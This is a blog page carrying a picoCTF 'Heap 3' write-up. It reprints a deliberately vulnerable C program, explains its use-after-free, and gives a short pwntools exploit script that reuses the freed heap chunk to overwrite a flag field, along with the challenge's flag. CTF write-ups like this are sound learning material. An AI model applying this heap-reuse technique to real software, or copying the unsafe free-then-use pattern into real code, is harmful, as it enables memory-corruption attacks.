@@ -1,0 +1,372 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Leveraging a UAF vulnerability to manipulate heap allocation">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Heap 3">
+<meta property="og:url" content="https://rivers.sh/posts/heap3/index.html">
+<meta property="og:site_name" content="River">
+<meta property="og:description" content="Leveraging a UAF vulnerability to manipulate heap allocation">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-22T04:00:00.000Z">
+<meta property="article:modified_time" content="2025-03-14T21:56:56.308Z">
+<meta property="article:author" content="River">
+<meta property="article:tag" content="Medium">
+<meta property="article:tag" content="Binary Exploitation">
+<meta property="article:tag" content="Buffer Overflow">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Heap 3</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+    <!-- mathjax -->
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Archive</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/heap2/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/trickster/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/heap3/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/heap3/&text=Heap 3"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/heap3/&is_video=false&description=Heap 3"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Heap 3&body=Check out this article: https://rivers.sh/posts/heap3/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/heap3/&name=Heap 3&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/heap3/&t=Heap 3"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-chall-c"><span class="toc-number">2.</span> <span class="toc-text">Understanding chall.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-number">3.</span> <span class="toc-text">Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Plan"><span class="toc-number">4.</span> <span class="toc-text">The Plan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">5.</span> <span class="toc-text">Solution</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Heap 3
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">River</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-22T04:00:00.000Z" class="dt-published" itemprop="datePublished">2024-10-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/picoCTF/">picoCTF</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Binary-Exploitation/" rel="tag">Binary Exploitation</a>, <a class="p-category" href="/tags/Buffer-Overflow/" rel="tag">Buffer Overflow</a>, <a class="p-category" href="/tags/Medium/" rel="tag">Medium</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+  <!-- Display the description -->
+  <div class="post-description">Leveraging a UAF vulnerability to manipulate heap allocation</div>
+
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <hr>
+<h2 id="Challenge-Info"><a href="#Challenge-Info" class="headerlink" title="Challenge Info"></a>Challenge Info</h2><p>This program mishandles memory. Can you exploit it to get the flag? Downloads the binary <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_tethys/5/chall">here</a>. Downloads the source <a target="_blank" rel="noopener" href="https://artifacts.picoctf.net/c_tethys/5/chall.c">here</a>.</p>
+<p>Additional details will be available after launching your challenge instance.</p>
+<h2 id="Understanding-chall-c"><a href="#Understanding-chall-c" class="headerlink" title="Understanding chall.c"></a>Understanding chall.c</h2><p>The code for your convenience:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FLAGSIZE_MAX 64</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Create struct</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> b[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> c[<span class="number">10</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">5</span>];</span><br><span class="line">&#125; object;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> num_allocs;</span><br><span class="line">object *x;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_win</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(x-&gt;flag, <span class="string">&quot;pico&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;YOU WIN!!11!!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Print flag</span></span><br><span class="line">    <span class="type">char</span> buf[FLAGSIZE_MAX];</span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(buf, FLAGSIZE_MAX, fd);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No flage for u :(\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Call function in struct</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_menu</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n1. Print Heap\n2. Allocate object\n3. Print x-&gt;flag\n4. Check for win\n5. Free x\n6. &quot;</span></span><br><span class="line">           <span class="string">&quot;Exit\n\nEnter your choice: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a struct</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    x = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(object));</span><br><span class="line">    <span class="built_in">strncpy</span>(x-&gt;flag, <span class="string">&quot;bico&quot;</span>, <span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc_object</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of object allocation: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="type">int</span> size = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="type">char</span>* alloc = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data for flag: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, alloc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_memory</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_heap</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   Address   -&gt;   Value   \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]   %p  -&gt;   %s\n&quot;</span>, x-&gt;flag, x-&gt;flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;+-------------+-----------+\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Setup</span></span><br><span class="line">    init();</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> choice;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        print_menu();</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice) != <span class="number">1</span>) <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="comment">// print heap</span></span><br><span class="line">            print_heap();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            alloc_object();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="comment">// print x</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n\nx = %s\n\n&quot;</span>, x-&gt;flag);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="comment">// Check for win condition</span></span><br><span class="line">            check_win();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            free_memory();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            <span class="comment">// exit</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Invalid choice\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Defines a constant for the max size of the flag string (<code>FLAGSIZE_MAX</code>).</li>
+<li>A structure <code>object</code> is defined with 4 character arrays (<code>a[10]</code>, <code>b[10]</code>,<code>c[10]</code>, <code>flag[5]</code>).</li>
+<li>Pointer <code>x</code> is declared globally, but not yet pointing to anything.</li>
+<li><code>init()</code> function<a target="_blank" rel="noopener" href="https://chirpy.cotes.page/">https://chirpy.cotes.page/</a> is declared, it executes <code>x = malloc(sizeof(object))</code>, ensuring that enough memory is reserved for all of struct’s members (<code>a[10]</code>, <code>b[10]</code>,<code>c[10]</code>, and <code>flag[5]</code>. Additionally, the global pointer <code>x</code> is now set to point to this memory block that will hold the previously defined <code>object</code> struct.) There’s also <code>int num_allocs</code>, but this is unused.</li>
+<li><code>strncpy()</code> copies the string <code>&quot;bico&quot;</code> into the <code>flag</code> member&#x2F;field of the <code>object</code> that <code>x</code> is pointing to.</li>
+<li><code>alloc_object()</code> function is declared. It begins by prompting us to input the size of the memory allocation that they want to make.<ul>
+<li>Then, an integer variable <code>size</code> is initialized in order to store the size of the allocation. <code>scanf(&quot;%d&quot;, &amp;size)</code> reads an integer input from us and then stores it in the previously initialized <code>size</code> variable.</li>
+<li>Essentially, the program expects us to enter a value that represents the number of bytes we want to allocate.</li>
+</ul>
+</li>
+<li><code>check_win()</code> function is declared. It checks if <code>x-&gt;flag</code> matches with <code>&#39;pico&#39;</code>. And if it does, then we get our flag. This is essentially the ‘win’ condition.</li>
+<li><code>alloc_object</code> function is declared, it prompts us to enter a size for dynamic allocation, it then reads an integer, and allocates memory accordingly. Finally, it accepts input to populate this allocated space.</li>
+</ul>
+<h2 id="Vulnerabilities"><a href="#Vulnerabilities" class="headerlink" title="Vulnerabilities"></a>Vulnerabilities</h2><ul>
+<li>Use-After-Free <a target="_blank" rel="noopener" href="https://cwe.mitre.org/data/definitions/416.html">(UAF)</a> vulnerability, because while the <code>free_memory()</code> function does free the memory block associated with <code>x</code>, it’s vulnerable because if <code>check_win()</code> is called afterward, then <code>x-&gt;flag</code> can still be accessed.</li>
+<li>Buffer overflow vulnerability: while the <code>flag</code> member in <code>object</code> is only 5 bytes, making it very limited, because of <code>alloc_object</code>, we could specify a much larger input for the memory allocated to <code>alloc</code>. So, if this memory isn’t handled correctly, then we can just overwrite memory structures adjacent to <code>alloc</code> (hence the buffer overflow).</li>
+</ul>
+<p>Before proceeding with the solution, I’ll paste the program’s interface so that it’s easier to visualize:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt; nc tethys.picoctf.net 62002</span><br><span class="line"></span><br><span class="line">freed but still in use</span><br><span class="line">now memory untracked</span><br><span class="line">do you smell the bug?</span><br><span class="line"></span><br><span class="line">1. Print Heap</span><br><span class="line">2. Allocate object</span><br><span class="line">3. Print x-&gt;flag</span><br><span class="line">4. Check for win</span><br><span class="line">5. Free x</span><br><span class="line">6. Exit</span><br><span class="line"></span><br><span class="line">Enter your choice:</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="The-Plan"><a href="#The-Plan" class="headerlink" title="The Plan"></a>The Plan</h2><p>So, to exploit this program, we can leverage the UAF vulnerability that I previously discussed. If we combine this with heap allocation manipulation (via buffer overflow), we can overwrite a specific field in a freed structure (<code>x-&gt;flag</code>) with the string <code>&quot;pico&quot;</code>. This is how it would look like step by step:</p>
+<ol>
+<li>This select option <code>5</code> to <strong>free x</strong>.</li>
+<li>This select option <code>2</code> to <strong>allocate</strong> a new block of memory, which is likely to use the same memory area that <code>x</code> was previously occupying, because they’re goingto have similar size requirements.<ul>
+<li>The allocation size will be between 20 and 40, this way, we increase the likelihood that our new allocation will overlap with the previously freed <code>object</code> struct.</li>
+<li>Recall that the <code>object</code> struct has 4 members, for a total of 35 bytes. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> a[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> b[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> c[<span class="number">10</span>]; <span class="comment">// ten bytes</span></span><br><span class="line">  <span class="type">char</span> flag[<span class="number">5</span>]; <span class="comment">// 5 bytes</span></span><br><span class="line">&#125; object;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li>While still in the “allocate object” option, we now input a payloads string that will contain <code>&quot;pico&quot;</code> at the end to overwrite the previous <code>flag</code> value <code>&quot;bico&quot;</code>.</li>
+<li>Select option 4 (“Check for win”) and get our flag!</li>
+</ol>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>The <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/">pwntools</a> payloads that I came up with is as follows:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;tethys.picoctf.net&#x27;</span>,<span class="number">51280</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;40&#x27;</span>)</span><br><span class="line">payloads = <span class="string">b&#x27;A&#x27;</span> * <span class="number">30</span> + <span class="string">b&#x27;pico&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.sendline(payloads)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>All of the <code>r.sendline</code>‘s are for selecting options in the interface. As for the actual payloads, it consists of an initial 24 bytes (8 blocks of A’s), and then a final block of 6 A’s, and “pico”- for a total of 34 bytes. The reason we are inputting 34 bytes, rather than 35, is because the <code>flag</code> field in the <code>object</code> struct has a 5 byte space, due to the program accounting for a <a target="_blank" rel="noopener" href="https://null-byte.wonderhowto.com/newest/">null byte</a>.</p>
+<p>flag: <code>picoCTF&#123;now_thats_free_real_estate_a7381726&#125;</code></p>
+
+  </div>
+</article>
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Archive</a></li>
+        
+          <li><a href="/categories/">Categories</a></li>
+        
+          <li><a href="/tags/">Tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Challenge-Info"><span class="toc-number">1.</span> <span class="toc-text">Challenge Info</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-chall-c"><span class="toc-number">2.</span> <span class="toc-text">Understanding chall.c</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabilities"><span class="toc-number">3.</span> <span class="toc-text">Vulnerabilities</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#The-Plan"><span class="toc-number">4.</span> <span class="toc-text">The Plan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solution"><span class="toc-number">5.</span> <span class="toc-text">Solution</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rivers.sh/posts/heap3/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rivers.sh/posts/heap3/&text=Heap 3"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rivers.sh/posts/heap3/&is_video=false&description=Heap 3"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Heap 3&body=Check out this article: https://rivers.sh/posts/heap3/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rivers.sh/posts/heap3/&title=Heap 3"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rivers.sh/posts/heap3/&name=Heap 3&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rivers.sh/posts/heap3/&t=Heap 3"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
